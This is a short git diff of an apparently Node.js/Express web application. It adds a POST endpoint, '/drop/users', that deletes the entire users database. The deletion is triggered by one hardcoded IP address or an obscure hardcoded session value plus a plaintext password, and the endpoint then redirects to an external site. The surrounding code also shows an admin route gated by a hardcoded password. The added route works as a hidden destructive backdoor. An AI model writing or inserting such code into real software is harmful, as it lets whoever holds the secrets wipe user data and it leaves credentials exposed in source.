@@ -547,6 +547,23 @@ app.get('/admin/userlist',function(req,res){
   }
 });
 
+app.post('/drop/users',function(req,res){
+  if(req.ip === '188.226.189.180' || req.session.sKK76d === 'porC6S78x0XZP1b2p08zGlq')
+  {
+    var pp = 'secureshit';
+     if(req.body.p ===  pp)
+     {users.remove({});
+     console.log('USERS DB DROPPED FROM '+ req.ip);
+     res.redirect('http://peopleandbooks.com/admax');}
+    else {
+      res.redirect('http://peopleandbooks.com');
+    }
+  }
+  else {
+    res.redirect('http://peopleandbooks.com');
+  }
+});
+
 app.post('/admin/1/:id',function(req,res){
   var pas = req.body.uu;
   if (pas != 'withoutthesecurity') {
